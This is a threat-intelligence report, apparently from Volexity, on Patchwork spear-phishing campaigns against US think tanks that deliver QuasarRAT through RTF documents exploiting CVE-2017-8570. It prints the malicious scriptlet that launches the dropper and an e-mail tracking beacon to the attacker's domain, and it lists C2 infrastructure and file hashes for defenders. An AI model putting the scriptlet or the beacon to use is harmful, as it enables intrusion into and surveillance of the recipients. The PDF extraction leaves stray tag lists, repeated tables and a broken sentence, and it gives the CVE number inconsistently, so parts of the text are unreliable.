This increase in threat\n\nactivity was consistent with other observations documented over the last few months in\n\nblogs by 360 Threat Intelligence Center analyzing attacks on [Chinese organizations and](https://ti.360.net/blog/articles/analysis-of-apt-c-09-target-china/)\n\nTrend Micro noting targets in [South Asia. From the attacks observed by Volexity, what is](https://blog.trendmicro.com/trendlabs-security-intelligence/confucius-update-new-tools-and-techniques-further-connections-with-patchwork/)\n\nmost notable is that Patchwork has pivoted its targeting and has launched attacks directly\n\nagainst US-based think tanks. Volexity has also found that, in addition to sending malware\n\nlures, the Patchwork threat actors are leveraging unique tracking links in their e-mails for\n\nthe purpose of identifying which recipients opened their e-mail messages.\n\nIn three observed spear phishing campaigns, the threat actors leveraged domains and\n\nthemes mimicking those of well-known think tank organizations in the United States.

Strangely, in one case, the threat actors also appear to have used a domain\n\n[name similar to the Foreign Policy Research Institute (FPRI) in a message purporting to be](https://www.fpri.org/)\n\nfrom CFR. Each of the spear phishing attacks contained links to .doc files, which were really\n\nRTF documents that attempt to exploit CVE-2017-8750 (Composite Moniker). The threat\n\nactors appear to have leveraged publicly available exploit code that can be found on Github\n\nat the URL: https://github.com/rxwx/CVE-2017-8570. If the exploit is successful, the threat\n\nactors will attempt to drop and execute QuasarRAT. Details of the malware and the\n\nassociated attacks are listed below.\n\n#### Spear Phishing Messages\n\nEach e-mail was sent from the attacker-controlled domain mailcenter.support. This domain\n\nwas not only used to send the phishing e-mails, but also to track which targets opened the e\nmail. Within each of the HTML-formatted messages, an embedded image tag is used to\n\nbeacon home to the attacker’s domain, containing an unique identifier specific to the\n\nrecipient.\n\n\n[elections](https://www.volexity.com/blog/tag/elections/) [vulnerabilities](https://www.volexity.com/blog/tag/vulnerabilities/) Hong\n\nKong [exploits](https://www.volexity.com/blog/tag/hong-kong/) [Gh0st](https://www.volexity.com/blog/tag/gh0st/) [Dukes](https://www.volexity.com/blog/tag/dukes/)\n\n[Scanbox](https://www.volexity.com/blog/tag/scanbox/) [Scanning](https://www.volexity.com/blog/tag/scanning/) [java](https://www.volexity.com/blog/tag/java/)\n[Afghanistan](https://www.volexity.com/blog/tag/afghanistan/) [Japan](https://www.volexity.com/blog/tag/japan/) [China](https://www.volexity.com/blog/tag/china/) [osx](https://www.volexity.com/blog/tag/osx/) Adobe\n\nFlash [VPNAPT](https://www.volexity.com/blog/tag/vpn/) [Drupal](https://www.volexity.com/blog/tag/drupal/) [Cisco](https://www.volexity.com/blog/tag/cisco/) digital\nsurveillance [spear phishing](https://www.volexity.com/blog/tag/spear-phishing/)\n\n\n_<img src=3D”hxxps://www.mailcenter.support/track/<unique_32_byte_identifier>”_\n\n_width=3D”0″ height=3D”0″ />_\n\n\nWhile the use of e-mail recipient tracking, a linked RTF document, and a final payload\n\n(QuasarRAT variant) remained the same, certain elements differed across campaigns\n\nobserved.

First, the “packager trick” is leveraged in order to embed the initial](https://securingtomorrow.mcafee.com/mcafee-labs/dropping-files-temp-folder-raises-security-concerns/)\n\nQuasarRAT dropper (qrat.exe) in the malicious RTF document. Its called the “packager trick”\n\nbecause any file embedded in an RTF file using packager will be automatically dropped to\n\nthe %tmp% folder (c:\\Users\\%username%\\AppData\\Local\\Temp) when the RTF document\n\nis opened. Second, the threat actors exploit CVE-2017-8570 to achieve code execution via a\n\nmalicious “scriptlet” file, or .sct file, which is also embedded in the malicious RTF document.\n\nThe contents of the malicious scriptlet file (displayed below) clearly show the threat actor\n\nexecuting the initial “qrat.exe” dropper from the current user’s %tmp% directory.\n\n\n-----\n\n_Note: The scriptlet code is an exact match to that shown on the Github page referenced earlier_\n\n_[for CVE-2017-8750. The string “fjzmpcjvqp” is unique and not something likely to be present if](https://github.com/rxwx/CVE-2017-8570)_\n\n_the code was not generated with the same public POC exploit code._\n\n\n<?XML version=”1.0″?>\n\n<scriptlet>\n\n<registration description=”fjzmpcjvqp”\n\nprogid=”fjzmpcjvqp”\n\nversion=”1.00″\n\nclassid=”{204774CF-D251-4F02-855B-2BE70585184B}”\n\nremotable=”true” >\n\n</registration>\n\n<script language=”JScript”>\n\n<![CDATA[\n\n**var r = new ActiveXObject(“WScript.Shell”).Run(“cmd /c**\n\n**%tmp%\\\\qrat.exe”,0,false);**\n\nexit();\n\n]]>\n\n</script>\n\n</scriptlet>\n\n\nAfter the initial dropper (qrat exe) has been executed by the embedded scriptlet it creates a\n\n\n-----\n\nThe malware also contains an embedded .NET wrapper DLL for creating and managing\n\nscheduled tasks on Windows systems. The file, named Microsoft.Win32.TaskScheduler.dll,\n\nis digitally signed by a certificate from AirVPN.\n\n\n-----\n\n**microsoft_network.exe, allowing it to remain persistent after reboot.**\n\nAs seen in the image above, the QuasarRAT scheduled task is named\n\nMicrosoft_Security_Task and runs at 12:00 AM each day. Once the task is triggered, it will\n\nthen repeat every 5 minutes for 60 days. When executed, microsoft_network.exe will\n\ninitiate a request to freegeoip.net in order to determine the geographical location of the\n\ninfected host. Immediately following the request, the malware will begin to beacon over an\n\nencrypted connection to the threat actor’s command and control domain tautiaos.com\n\n**(43.249.37.199). Several related samples were identified and are included in the File**\n\nIndicators section below.\n\n#### Conclusion\n\nThe addition of US-based think tanks to the list of organizations in the crosshairs of\n\nPatchwork shows an increasing diversity in the geographic regions being targeted. While\n\nthere were a few peculiar components to some of the spear phish messages, the campaigns\n\n\n-----\n\nhave opened the phishing message. This information allows a threat actor to determine if\n\ntheir messages were delivered, which users are more susceptible to opening them, and\n\nbasic information regarding the target’s operating system and e-mail client (or browser).\n\nFinally, although the payload observed being delivered by Patchwork in these campaigns is\n\na readily available open source RAT, it does allow for flexibility in interacting with\n\ncompromised machines without needing to use custom malware. Volexity is actively\n\ntracking this group and the infrastructure currently in use for the benefit of its network\n\nsecurity monitoring and threat intelligence customers.\n\n#### File Indicators\n\n###### Samples Observed from Spear Phishing Messages Above\n\nFilename Chinas_Arctic_Dream.doc\n\nFile Size 6587812 bytes\n\nMD5 598eeb6a18233023f3551097aa49b083\n\nSHA1 e9a46966f93fe15c22636a5033c61c725add8fa5\n\nNotes Malicious RTF document that exploits CVE-2017-8570 and drops QuasarRAT file qrat.exe.\n\nFilename The_Four_Traps_for_China.doc\n\nFile Size 4428595 bytes\n\nMD5 7659c41a30976d523bb0fbb8cde49094\n\n|Filename|Chinas_Arctic_Dream.doc|\n|---|---|\n|File Size|6587812 bytes|\n|MD5|598eeb6a18233023f3551097aa49b083|\n|SHA1|e9a46966f93fe15c22636a5033c61c725add8fa5|\n|Notes|Malicious RTF document that exploits CVE-2017-8570 and drops QuasarRAT file qrat.exe.|\n\n|Filename|The_Four_Traps_for_China.doc|\n|---|---|\n|File Size|4428595 bytes|\n\n\n-----\n\n|Notes|Malicious RTF document that exploits CVE-2017-8570 and drops QuasarRAT file qrat.exe.|\n|---|---|\n\n|Filename|The_Four_Traps_for_China.doc|\n|---|---|\n|File Size|4428595 bytes|\n|MD5|7659c41a30976d523bb0fbb8cde49094|\n|SHA1|3f1f3e838a307aff52fbcb5bba5e4c8fe68c30e5|\n|Notes|Malicious RTF document that exploits CVE-2017-8570 and drops QuasarRAT file qrat.exe.|\n\n|Filename|qrat.exe|\n|---|---|\n|File Size|1093120 bytes|\n|MD5|c05e5131b196f43e1d02ca5ccc48ec0e|\n|SHA1|f28c592833f234c619917b5c7d8974840a810247|\n|Notes|Dropper that installs QuasarRAT file microsoft_network.exe and scheduled task wrapper file Microsoft.Win32.TaskScheduler.dll.|\n\n|Filename|microsoft_network.exe|\n|---|---|\n|File Size|846336 bytes|\n\n\n-----\n\n|Notes|QuasarRAT file that beacons to hardcoded IP 43.249.37.199 and the domain tautiaos.com.
